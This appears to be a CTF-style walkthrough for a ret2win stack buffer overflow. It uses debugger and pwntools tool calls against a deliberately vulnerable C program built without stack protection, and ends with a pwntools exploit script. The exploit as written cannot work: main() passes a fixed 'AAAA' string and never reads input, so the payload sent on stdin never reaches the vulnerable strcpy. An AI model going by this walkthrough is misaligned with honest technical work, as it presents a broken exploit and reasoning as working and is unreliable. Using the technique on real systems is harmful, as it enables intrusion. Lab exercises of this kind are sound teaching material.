# ret2win — Buffer Overflow to Win Function

A simple CTF-style challenge demonstrating buffer overflow exploitation using EDB MCP tools.

## The Binary

```c
void win() { printf("You win!\n"); }
void vuln(char *input) { char buf[64]; strcpy(buf, input); }
int main() { vuln("AAAA"); return 0; }
```

Compiled with: `gcc -g -O0 -fno-stack-protector -no-pie -o ret2win ret2win.c`

## Walkthrough

### 1. Load and recon

```
edb_load_program(path="/tmp/ret2win")
edb_list_functions()
edb_get_binary_info()
```

### 2. Find the win function address

```
edb_lookup_symbol(name="win")
```

### 3. Disassemble vuln to find buffer size

```
edb_disassemble(location="vuln", count=20)
```

The buffer is at `rbp-0x40` (64 bytes). Stack layout: `[buf: 64][saved rbp: 8][ret addr: 8]`

### 4. Find overflow offset

```
pwntools_cyclic(length=256)
```

Run with cyclic pattern, check crash offset with:

```
pwntools_cyclic_find(value="<crashed_value>")
```

### 5. Generate exploit payload

```
pwntools_pack(value=<win_address>, size=8, endian="little")
```

### 6. Set breakpoint and verify

```
edb_set_breakpoint(location="vuln")
edb_run()
edb_get_stack(count=16)  # see the overflow
edb_step_instruction(count=5)
edb_get_stack(count=16)  # see AAAA overwriting buffer
```

## Exploit Script

```python
from pwn import *

win_addr = 0x4011a2  # change to your binary's win address
payload = cyclic(72) + p64(win_addr)

p = process("/tmp/ret2win")
p.sendline(payload)
print(p.recvall().decode())
```
